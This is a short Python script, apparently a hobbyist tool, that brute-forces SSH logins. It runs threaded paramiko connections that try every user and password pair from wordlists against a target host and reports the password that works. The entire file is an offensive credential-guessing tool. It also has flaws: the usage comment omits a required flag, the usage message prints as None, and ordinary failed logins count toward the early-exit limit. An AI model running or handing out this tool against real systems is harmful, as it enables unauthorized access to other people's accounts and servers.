# -*- coding: utf-8 -*-
# @Autor: Diego Rodrigues Pereira
# Comando: python ssh_bruteforce.py -H 192.168.1.1 -U users.txt -W wordlist.txt 
import argparse
import paramiko
import time
import threading
import os

maxConnections = 5
connection_lock = threading.BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    global Found, Fails
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, username=user, password=password, timeout=5)
        print('[+] Good , Key Found: ' + password)
        Found = True
    except Exception as e:
        if 'Authentication failed' in str(e):
            Fails += 1
        elif 'timed out' in str(e):
            Fails += 1
        else:
            print(str(e))
    finally:
        ssh.close()
        if release:
            connection_lock.release()

def run():
    parser = argparse.ArgumentParser('usage: '+'-H <target host> -U <userlist> -P <passlist>')
    parser.add_argument('-H', dest='tgtHost', type=str, help='specify target host')
    parser.add_argument('-U', dest='userList', type=str, help='specify user list file')
    parser.add_argument('-P', dest='passList', type=str, help='specify password list file')
    parser.add_argument('-W', dest='wordlist', type=str, help='specify wordlist file')
    parser.add_argument('-c', dest='count', type=int, help='specify the max ssh connect count, default 5', default=5)
    args = parser.parse_args()

    global connection_lock
    connection_lock = threading.BoundedSemaphore(args.count)

    host = args.tgtHost
    userListFile = args.userList
    passListFile = args.passList
    wordlistFile = args.wordlist

    if host is None or userListFile is None or passListFile is None:
        print(parser.usage)
        exit(0)

    with open(userListFile, 'r') as users:
        userList = users.read().splitlines()

    if wordlistFile:
        with open(wordlistFile, 'r') as f:
            passList = f.read().splitlines()
    else:
        with open(passListFile, 'r') as passes:
            passList = passes.read().splitlines()

    for user in userList:
        for password in passList:
            if Found:
                print("[*] Exiting: Key Found")
                exit(0)
            if Fails > 5:
                print("[!] Exiting: Too Many Socket Timeouts")
                exit(0)
            connection_lock.acquire()
            print("[-] Testing: " + user + " / " + password)
            t = threading.Thread(target=connect, args=(host, user, password, True))
            t.start()

if __name__ == '__main__':
    run()
